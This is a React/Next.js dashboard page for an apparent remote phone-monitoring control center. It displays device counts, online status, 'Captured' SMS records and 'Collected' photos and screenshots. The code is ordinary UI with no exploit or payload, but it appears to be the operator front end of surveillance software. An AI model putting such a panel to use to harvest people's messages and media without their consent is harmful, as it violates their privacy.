'use client';

import { useEffect, useState, useCallback, Suspense } from 'react';
import Sidebar from '@/components/layout/Sidebar';
import Header from '@/components/layout/Header';
import DeviceCard from '@/components/devices/DeviceCard';
import { getDevices, refreshRealtimeStatus } from '@/lib/api';
import { useDevicesStore, useAuthStore } from '@/lib/store';
import { connectSocket } from '@/lib/socket';
import { subscribeToDeviceStatuses } from '@/lib/firebase';
import {
  Smartphone,
  Globe,
  MessageSquare,
  Camera,
  Activity,
  TrendingUp,
  Zap,
} from 'lucide-react';
import { useRouter } from 'next/navigation';

export default function Dashboard() {
  return (
    <Suspense fallback={null}>
      <DashboardContent />
    </Suspense>
  );
}

function DashboardContent() {
  const router = useRouter();
  const { isAuthenticated, isHydrated } = useAuthStore();
  const { devices, setDevices, updateDevice } = useDevicesStore();
  const [loading, setLoading] = useState(true);
  const [stats, setStats] = useState({
    total: 0,
    online: 0,
    totalSms: 0,
    totalPhotos: 0,
  });

  // Check auth
  useEffect(() => {
    if (isHydrated && !isAuthenticated) {
      router.push('/login');
    }
  }, [isHydrated, isAuthenticated, router]);

  const fetchDevices = useCallback(async () => {
    try {
      setLoading(true);
      // First sync real-time status from socket connections
      await refreshRealtimeStatus().catch(() => { });

      const data = await getDevices();
      if (data.success) {
        setDevices(data.devices);

        // Calculate stats
        const onlineCount = data.devices.filter((d: any) => d.isOnline).length;
        const totalSms = data.devices.reduce((sum: number, d: any) => sum + (d.stats?.sms || 0), 0);
        const totalPhotos = data.devices.reduce((sum: number, d: any) => sum + (d.stats?.photos || 0) + (d.stats?.screenshots || 0), 0);

        setStats({
          total: data.devices.length,
          online: onlineCount,
          totalSms,
          totalPhotos,
        });
      }
    } catch (error) {
      console.error('Failed to fetch devices:', error);
    } finally {
      setLoading(false);
    }
  }, [setDevices]);

  useEffect(() => {
    if (isAuthenticated) {
      fetchDevices();

      // Setup socket listeners (fallback)
      const socket = connectSocket();

      socket.on('device:online', (data) => {
        updateDevice(data.deviceId, { isOnline: true });
      });

      socket.on('device:offline', (data) => {
        updateDevice(data.deviceId, { isOnline: false });
      });

      // Subscribe to Firebase for INSTANT status updates
      const unsubscribeFirebase = subscribeToDeviceStatuses((statusMap) => {
        console.log('[Firebase] Status update:', statusMap.size, 'devices');
        statusMap.forEach((status, deviceId) => {
          updateDevice(deviceId, { isOnline: status.online });
        });

        // Update stats
        const onlineCount = Array.from(statusMap.values()).filter(s => s.online).length;
        setStats(prev => ({ ...prev, online: onlineCount }));
      });

      return () => {
        socket.off('device:online');
        socket.off('device:offline');
        unsubscribeFirebase();
      };
    }
  }, [isAuthenticated, fetchDevices, updateDevice]);

  if (!isHydrated || !isAuthenticated) {
    return null;
  }

  const statsCards = [
    {
      label: 'Total Devices',
      value: stats.total,
      icon: Smartphone,
      color: 'blue',
      subtitle: 'Registered',
      trend: '+12%',
    },
    {
      label: 'Online Now',
      value: stats.online,
      icon: Globe,
      color: 'emerald',
      subtitle: `${stats.total > 0 ? Math.round((stats.online / stats.total) * 100) : 0}% Active`,
      live: true,
    },
    {
      label: 'SMS Records',
      value: stats.totalSms.toLocaleString(),
      icon: MessageSquare,
      color: 'purple',
      subtitle: 'Captured',
    },
    {
      label: 'Media Files',
      value: stats.totalPhotos.toLocaleString(),
      icon: Camera,
      color: 'orange',
      subtitle: 'Collected',
    },
  ];

  return (
    <div className="flex min-h-screen bg-[var(--background)]">
      <Sidebar />
      <main className="flex-1 lg:ml-72">
        <Header title="Dashboard" subtitle="Welcome back to your control center" onRefresh={fetchDevices} />

        <div className="p-4 lg:p-8 max-w-7xl mx-auto animate-fade-in">
          {/* Stats Cards */}
          <div className="grid grid-cols-2 lg:grid-cols-4 gap-4 lg:gap-6 mb-8 lg:mb-12">
            {statsCards.map((stat, i) => {
              const Icon = stat.icon;
              return (
                <div
                  key={i}
                  className="card bg-white p-4 lg:p-6 group hover:shadow-xl"
                >
                  <div className="flex items-start justify-between mb-3 lg:mb-4">
                    <div className={`w-10 h-10 lg:w-12 lg:h-12 rounded-xl bg-${stat.color}-50 flex items-center justify-center border border-${stat.color}-100 group-hover:scale-110 transition-transform`}>
                      <Icon className={`w-5 h-5 lg:w-6 lg:h-6 text-${stat.color}-500`} />
                    </div>
                    {stat.live && (
                      <div className="flex items-center gap-1.5 px-2 py-1 rounded-full bg-emerald-50 border border-emerald-200">
                        <span className="w-1.5 h-1.5 rounded-full bg-emerald-500 animate-pulse" />
                        <span className="text-[10px] font-semibold text-emerald-600">Live</span>
                      </div>
                    )}
                  </div>
                  <p className="text-2xl lg:text-3xl font-bold text-[var(--foreground)] tracking-tight">{stat.value}</p>
                  <p className="text-xs lg:text-sm font-medium text-[var(--muted)] mt-1">{stat.label}</p>
                  <div className="flex items-center gap-2 mt-2 lg:mt-3">
                    <span className={`text-[10px] font-semibold text-${stat.color}-600 bg-${stat.color}-50 px-2 py-0.5 rounded-md`}>
                      {stat.subtitle}
                    </span>
                  </div>
                </div>
              );
            })}
          </div>

          {/* Devices Grid Area */}
          <div className="mb-8 lg:mb-12">
            <div className="flex items-center justify-between mb-6 lg:mb-8">
              <div className="flex items-center gap-3 lg:gap-4">
                <div className="p-2 lg:p-2.5 rounded-xl bg-[var(--primary-glow)] border border-[var(--primary)]/20">
                  <Smartphone className="w-4 h-4 lg:w-5 lg:h-5 text-[var(--primary)]" />
                </div>
                <div>
                  <h2 className="text-lg lg:text-xl font-bold text-[var(--foreground)] tracking-tight">Your Devices</h2>
                  <p className="text-xs text-[var(--muted)] font-medium hidden sm:block">{devices.length} devices synced</p>
                </div>
              </div>
              <div className="hidden sm:block h-px flex-1 mx-8 bg-gradient-to-r from-[var(--border)] to-transparent" />
            </div>

            {loading ? (
              <div className="grid grid-cols-1 md:grid-cols-2 xl:grid-cols-3 gap-4 lg:gap-6">
                {[1, 2, 3].map((i) => (
                  <div key={i} className="card h-48 lg:h-64 bg-[var(--background)] skeleton" />
                ))}
              </div>
            ) : devices.length === 0 ? (
              <div className="card bg-white p-12 lg:p-24 text-center flex flex-col items-center justify-center">
                <div className="w-20 h-20 lg:w-24 lg:h-24 rounded-3xl bg-[var(--background)] flex items-center justify-center mb-6 lg:mb-10 border border-[var(--border)]">
                  <Smartphone className="w-10 h-10 lg:w-12 lg:h-12 text-[var(--muted-light)]" />
                </div>
                <h3 className="text-xl lg:text-2xl font-bold text-[var(--foreground)] mb-2 lg:mb-4">No Devices Yet</h3>
                <p className="text-[var(--muted)] font-medium max-w-sm text-sm lg:text-base leading-relaxed">
                  Your device list is empty. Register a new device to start monitoring.
                </p>
                <div className="flex items-center gap-2 text-xs font-semibold text-[var(--primary)] bg-[var(--primary-glow)] px-4 py-2 rounded-full mt-6 lg:mt-8 border border-[var(--primary)]/20">
                  <Zap className="w-3.5 h-3.5" />
                  Waiting for device connection...
                </div>
              </div>
            ) : (
              <div className="grid grid-cols-1 md:grid-cols-2 xl:grid-cols-3 gap-4 lg:gap-6">
                {devices.map((device) => (
                  <DeviceCard key={device.id} device={device} />
                ))}
              </div>
            )}
          </div>
        </div>
      </main>
    </div>
  );
}
